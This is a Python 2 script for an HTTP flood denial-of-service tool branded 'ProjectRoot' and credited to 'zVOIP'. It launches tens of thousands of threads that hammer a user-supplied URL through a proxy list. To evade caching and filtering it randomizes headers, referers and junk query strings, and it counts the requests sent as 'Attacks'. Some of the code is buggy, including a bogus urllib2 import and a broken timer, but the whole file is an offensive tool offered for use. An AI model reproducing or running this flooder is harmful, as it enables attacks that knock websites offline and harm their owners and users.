# -*- coding: UTF-8 -*-

# Import shits
from threading import Thread
import time
import Queue
import os
import module as urllib2
import random
import sys

intro = """                                                       
I wanted to change the world but god didn't give me the source code ;)
"""	

#Who doesnt like colours
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

print  \
"""                                                       
    ____               _           __  ____              __     __ __ 
   / __ \_________    (_)__  _____/ /_/ __ \____  ____  / /_  _/_//_/ 
  / /_/ / ___/ __ \  / / _ \/ ___/ __/ /_/ / __ \/ __ \/ __/_/_//_/(_)
 / ____/ /  / /_/ / / /  __/ /__/ /_/ _, _/ /_/ / /_/ / /__/_//_/ _   
/_/   /_/   \____/_/ /\___/\___/\__/_/ |_|\____/\____/\__/_//_/  ( )  
                /___/                                            |/ 

Bringing you the best Python scripts.
View bot by zVOIP!			
"""	
time.sleep(2)	
#Settings
the = 65500
def clear():
	os.system('cls')  # on windows
startup = sys.argv[1:]
if len(startup) == 1:
	print "Using API mode"
	attack_host = sys.argv[1]
	max_time = sys.argv[1]
	the = 65500
else:
	clear()
	print bcolors.OKBLUE + \
"""                                                       
    ____               _           __  ____              __     __ __ 
   / __ \_________    (_)__  _____/ /_/ __ \____  ____  / /_  _/_//_/ 
  / /_/ / ___/ __ \  / / _ \/ ___/ __/ /_/ / __ \/ __ \/ __/_/_//_/(_)
 / ____/ /  / /_/ / / /  __/ /__/ /_/ _, _/ /_/ / /_/ / /__/_//_/ _   
/_/   /_/   \____/_/ /\___/\___/\__/_/ |_|\____/\____/\__/_//_/  ( )  
                /___/                                            |/ 

Bringing you the best Python scripts.
Need help? Contact zVOIP or Bane.				
"""			
	print bcolors.OKGREEN + "UI Mode!"
	attack_host = raw_input(bcolors.FAIL + "Link: ")
	clear()
	max_time = int(raw_input('Time in seconds (even if I changed it to requests it wouldn\'t be accurate): '))

#Random Shit
threads = []
proxylist = [line.rstrip('\n') for line in open('./proxies.txt')]
globals()['proxy'] = proxylist
global req
req = 0
clear()

#Main ddos
class bot(Thread):
	def __init__(self):
		self.queue = Queue
		self.proxy = None
		self.opener = None
		Thread.__init__(self)
	def newagent(self):
		self.proxy = None
		self.opener = None
		self.proxy = random.choice(self.proxylist).split(':')
		self.proxy = 'http://' + str(self.proxy[0]) + ':' + str(self.proxy[1])
		self.proxy = urllib2.ProxyHandler({'http': self.proxy})
		self.opener = urllib2.build_opener(self.proxy)
		header = {
			'User-Agent':'',
			'Cache-Control':'',
			'Accept-Charset':'',
			'Keep-Alive':'',
			'Connection':'',
			'Host':'',
			'Referer':'',
		}
		if random.randint(0,1) == 1:
			header['User-agent'] = 'Mozilla/5.0 ' + self.hugeagent()
		else:
			 header['User-agent'] = self.useragent_list()
		if random.randint(0,1) == 1:
			 header['Cache-Control'] = 'no-cache'
		else:
			 header['Cache-Control'] = 'max-age=' + str(random.randint(0,1000))
		if random.randint(0,4) == 1:
			 header['Accept-Charset'] = 'ISO-8859-1'
		else:
			if random.randint(0,4) == 1:
				 header['Accept-Charset'] = 'ISO-8859-1,utf-8;q=0.7'
			else:
				 header['Accept-Charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
		header['Keep-Alive'] = random.randint(100,300)
		header['Connection'] = 'keep-alive'
		if random.randint(0,1) == 1:
			 header['Host'] = attack_host
		else:
			 header['Host'] = attack_host + self.buildblock()
		#Ref
		if random.randint(0,1) == 1:
			 header['Referer'] = self.referer_list()
		else:
			 header['Referer'] = attack_host
		if random.randint(0, 10) == 1:
			header['User-Agent'] += "[CRLF]"
			header['Cache-Control'] += "[CRLF]"
			header['Accept-Charset'] += "[CRLF]"
			header['Keep-Alive'] += "[CRLF]"
			header['Connection'] += "[CRLF]"
			header['Referer'] += "[CRLF]"
		self.opener.addheaders = [
			('User-agent', header['User-Agent']),
			('Cache-Control', header['Cache-Control']),
			('Accept-Charset', header['Accept-Charset']),
			('Keep-Alive', header['Keep-Alive']),
			('Connection', header['Connection']),
			('Referer', header['Referer'])]
	def run(self):
		self.proxylist = globals()['proxy']
		while True:
			try:
				global req
				req+=1
				self.newagent()
				for i in range(5):
					if (random.randint(0, 5)) == 1:
						self.opener.open(self.generateData(), timeout=random.randint(1, 10))
					else:
						self.opener.open(attack_host, timeout=random.randint(1, 3))
			except:
				pass
	def generateData(self):
		param_joiner = "?"
		if attack_host.count("?") > 0:
			param_joiner = "&"
		request_url = self.generateRequestUrl(param_joiner)
		return (request_url)
	def generateQueryString(self, ammount = 1):
		queryString = []
		for i in range(ammount):
			key = self.buildblock()
			value = self.buildblock()
			element = "{0}={1}".format(key, value)
			queryString.append(element)
		return '&'.join(queryString)
	def generateRequestUrl(self, param_joiner = '?'):
		return attack_host + param_joiner + self.generateQueryString(random.randint(1,5))
	def useragent_list(self):
		headers_useragents = []
		headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET clear 2.0.50727; .NET clear 1.1.4322; .NET clear 3.5.30729; .NET clear 3.0.30729)')
		return(random.choice(headers_useragents))
	def referer_list(self):
		headers_referers = []
		headers_referers.append('https://duckduckgo.com/?q=' + attack_host)
		headers_referers.append('http://www.google.com/?q=' + attack_host)
		headers_referers.append('http://www.google.com/?q=' + attack_host)
		return(random.choice(headers_referers))
	def buildblock(self):
		out_str = ''
		for i in range(0, random.randint(3,20)):
			a = random.randint(65, 90)
			out_str += chr(a)
		return(out_str)
	def hugeagent(self):
		out_str = ''
		for i in range(0, random.randint(200,1000)):
			a = random.randint(65, 90)
			out_str += chr(a)
		return(out_str)

def exit():
	clear()
	print bcolors.WARNING + "Time ran out!, Total requests: %s" % str(req)

clear()


if len(attack_host)==0:
    print "Website is invalid!"
else:
	#global req
	print bcolors.OKBLUE + intro
	print bcolors.WARNING + "Press 'CTR + Z' to stop the bots\n"
	print bcolors.OKGREEN + "Sending requests: %s" % attack_host

for i in range(the):
	try:
		t = bot()
		t.daemon = True
		threads.append(t)
		t.start()
	except:
		print "Cant make a thread :?" 
max_time = max_time
while time.time() < max_time:
	time.sleep(1)
	print bcolors.OKGREEN + "Attacks, " + str(req)

exit()